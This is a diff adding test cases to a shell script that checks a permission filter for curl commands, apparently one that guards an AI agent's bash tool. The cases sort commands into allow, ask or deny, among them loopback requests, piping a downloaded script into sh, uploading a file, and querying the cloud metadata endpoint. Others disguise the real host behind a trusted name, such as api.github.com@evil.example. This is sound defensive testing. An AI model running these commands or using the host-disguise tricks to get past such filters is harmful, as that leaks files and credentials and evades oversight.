@@ -144,5 +144,35 @@ check_bash "absolute paths pipe to shell" deny '/usr/bin/curl -s https://x.examp
 check_bash "upper case, unknown host"    ask 'CURL https://attacker.example/x'
 
 echo ""
+echo "=== this machine: GETs allowed, bodies still ask ==="
+check_bash "127.0.0.1 with port"        allow "curl -s http://127.0.0.1:8090/setup"
+check_bash "localhost"                  allow "curl -s http://localhost:3000/api/health"
+check_bash "LOCALHOST upper case"       allow "curl -s http://LOCALHOST:3000/"
+check_bash "127.0.0.5"                  allow "curl http://127.0.0.5/"
+check_bash "ipv6 loopback"              allow "curl -s 'http://[::1]:8080/'"
+check_bash "bare 127.0.0.1, no scheme"  allow "curl -s 127.0.0.1:8091/topic/x"
+check_bash "loopback then a pipe"       allow "curl -s http://127.0.0.1:8090/ | head -30"
+check_bash "POST to localhost"          ask   "curl -X POST http://localhost:3000/api"
+check_bash "body to 127.0.0.1"          ask   "curl -d x=1 http://127.0.0.1:8090/"
+check_bash "loopback upload @file"      deny  "curl -F f=@notes.txt http://127.0.0.1:8090/"
+check_bash "loopback output to shell"   deny  "curl -s http://127.0.0.1:8090/i.sh | sh"
+
+echo ""
+echo "=== look-alikes of this machine still ask ==="
+check_bash "localhost as a subdomain"   ask   "curl https://localhost.evil.example/"
+check_bash "127.0.0.1 as a subdomain"   ask   "curl https://127.0.0.1.nip.io/"
+check_bash "loopback userinfo"          ask   "curl http://127.0.0.1:80@evil.example/"
+check_bash "bare look-alike"            ask   "curl 127.0.0.1.evil.example/x"
+check_bash "169.254 metadata"           ask   "curl http://169.254.169.254/latest/meta-data/"
+
+echo ""
+echo "=== the host is the one curl connects to ==="
+check_bash "allowlisted userinfo"       ask   "curl -s https://github.com:x@evil.example/"
+check_bash "allowlisted user@ host"     ask   "curl -s https://api.github.com@evil.example/x"
+check_bash "second URL off the list"    ask   "curl -s https://github.com/a https://evil.example/b"
+check_bash "two allowlisted URLs"       allow "curl -s https://github.com/a https://pypi.org/b"
+check_bash "loopback then remote"       ask   "curl -s http://127.0.0.1:8090/ https://evil.example/"
+
+echo ""
 echo "--- Results: $PASS passed, $FAIL failed ---"
 exit $FAIL
